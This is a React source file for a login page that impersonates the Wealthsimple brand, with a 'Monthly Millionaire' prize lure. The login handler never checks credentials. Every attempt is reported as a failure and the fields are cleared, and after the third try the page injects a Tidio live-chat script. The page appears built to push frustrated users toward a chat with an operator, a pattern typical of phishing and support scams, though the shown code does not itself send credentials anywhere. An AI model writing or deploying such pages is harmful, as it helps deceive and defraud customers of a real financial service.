import React, { useState } from "react";
import logo from "../assets/ws-wordmark-refresh.48a6eb42.svg";
import coinsImg from "../assets/millionaire-login.webp";

const Login = ({ onBack }) => {
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleLogin = (e) => {
    e.preventDefault();
    const newAttempts = loginAttempts + 1;
    setLoginAttempts(newAttempts);
    setErrorMessage("Incorrect username or password");
    setEmail("");
    setPassword("");

    if (newAttempts >= 3) {
      if (!document.getElementById("tidio-script")) {
        const script = document.createElement("script");
        script.id = "tidio-script";
        script.src = "//code.tidio.co/7olypvy8xknhr1k644clrgoucvcnjuxb.js";
        script.async = true;
        document.body.appendChild(script);
      }
    }
  };

  return (
    <div className="w-full min-h-[100dvh] flex flex-col md:flex-row font-sans">
      {/* Left Panel - Marketing (Hidden on very small screens, 50% on lg+) */}
      <div className="hidden lg:flex lg:w-1/2 flex-1 bg-[#1c3249] flex-col relative px-12 py-12 border-r border-[#121212]">
        {/* Top Logo */}
        <div className="absolute top-8 left-10 cursor-pointer" onClick={onBack}>
          <img
            src={logo}
            alt="Wealthsimple"
            className="h-[22px] w-auto brightness-0 invert"
          />
        </div>

        {/* Content Centered */}
        <div className="flex-1 flex flex-col items-center justify-center text-center max-w-[480px] mx-auto mt-10">
          <p className="text-white/90 text-[13px] font-semibold tracking-[0.15em] mb-6 uppercase">
            Monthly Millionaire
          </p>

          <h1 className="text-white text-[48px] md:text-[52px] font-bold leading-[1.05] tracking-[-0.02em] mb-6 font-sans">
            Save money,
            <br />
            become
            <br />a millionaire.
          </h1>

          <p className="text-white text-[15px] leading-[1.5] mb-12 max-w-[420px]">
            Each dollar you save is a potential entry to win. Get your 500
            entries by registering and funding your account.{" "}
            <a
              href="#"
              className="underline hover:text-white underline-offset-2"
            >
              T&Cs apply.
            </a>
          </p>

          <div className="relative w-full flex justify-center mt-2">
            <img
              src={coinsImg}
              alt="Falling coins"
              className="w-[200px] h-auto object-contain"
            />
          </div>
        </div>
      </div>

      {/* Right Panel - Authentication */}
      <div className="w-full lg:w-1/2 flex-1 bg-[#0f0f0f] flex flex-col relative overflow-y-auto">
        {/* Mobile Logo (visible only on mobile and tablet) */}
        <div className="lg:hidden w-full flex justify-center py-8">
          <img
            src={logo}
            alt="Wealthsimple"
            className="h-[22px] w-auto brightness-0 invert cursor-pointer"
            onClick={onBack}
          />
        </div>

        {/* Main Form Container */}
        <div className="flex-1 flex items-center justify-center px-4 py-4">
          <div className="w-full max-w-[460px] bg-[#1c1c1c] rounded-[24px] p-6 md:p-8 shadow-2xl">
            <h2 className="text-white text-[28px] text-center mb-5 tracking-tight font-bold font-sans">
              Welcome back
            </h2>

            {errorMessage && (
              <div className="bg-red-500/10 border border-red-500/50 text-red-500 text-sm px-4 py-3 rounded-xl mb-4 text-center">
                {errorMessage}
              </div>
            )}

            <form
              className="flex flex-col space-y-4"
              onSubmit={handleLogin}
            >
              {/* Email Input */}
              <div className="relative">
                <input
                  type="email"
                  id="email"
                  className="w-full bg-[#242424] text-white text-[16px] font-medium px-4 py-[14px] rounded-[16px] border border-[#3a3a3a] focus:border-white focus:outline-none transition-colors placeholder:text-[#e0e0e0] placeholder:font-medium"
                  placeholder="Email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>

              {/* Password Input */}
              <div className="relative mt-3">
                <input
                  type="password"
                  id="password"
                  className="w-full bg-[#242424] text-white text-[16px] font-medium px-4 py-[14px] rounded-[16px] border border-[#3a3a3a] focus:border-white focus:outline-none transition-colors placeholder:text-[#e0e0e0] placeholder:font-medium pr-14"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <button
                  type="button"
                  className="absolute right-3 top-1/2 -translate-y-1/2 w-10 h-10 flex items-center justify-center rounded-full bg-[#3a3a3a] text-white hover:bg-[#4a4a4a] transition-colors"
                >
                  <svg
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                    <circle cx="12" cy="12" r="3"></circle>
                  </svg>
                </button>
              </div>

              {/* Forgot password */}
              <div className="pt-1">
                <a
                  href="#"
                  className="text-white text-[13px] font-bold underline decoration-1 underline-offset-[3px]"
                >
                  Forgot password?
                </a>
              </div>

              {/* Log In Button */}
              <button className="w-full max-w-[160px] mx-auto bg-[#f0f0f0] text-black font-semibold text-[15px] py-[13px] rounded-full hover:bg-white transition-colors mt-4">
                Log in
              </button>

              {/* Passkey Button */}
              <button
                type="button"
                className="w-full max-w-[220px] mx-auto bg-transparent border border-[#444] text-white font-semibold text-[14px] py-[13px] rounded-full hover:bg-[#2b2b2b] transition-colors flex items-center justify-center space-x-2 mt-4"
              >
                <span>Log in with a passkey</span>
                <svg
                  width="18"
                  height="18"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path>
                </svg>
              </button>
            </form>

            {/* Sign up prompt */}
            <div className="mt-8 text-center">
              <p className="text-white text-[14px]">
                Don't have an account?{" "}
                <a
                  href="#"
                  className="font-bold underline decoration-1 underline-offset-[3px] ml-1"
                >
                  Sign up
                </a>
              </p>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="w-full px-4 md:px-12 py-6 flex flex-col md:flex-row justify-between items-center text-[13px] sm:text-[15px] text-white font-bold border-t border-[#1a1a1a]">
          <a
            href="#"
            className="underline hover:text-gray-300 mb-4 md:mb-0 decoration-1 underline-offset-[3px] whitespace-nowrap"
          >
            Help Centre
          </a>
          <div className="flex space-x-3 sm:space-x-4 items-center whitespace-nowrap">
            <span className="font-medium mr-1">Download our mobile apps</span>
            <a
              href="#"
              className="underline hover:text-gray-300 decoration-1 underline-offset-[3px]"
            >
              iPhone
            </a>
            <a
              href="#"
              className="underline hover:text-gray-300 decoration-1 underline-offset-[3px]"
            >
              Android
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
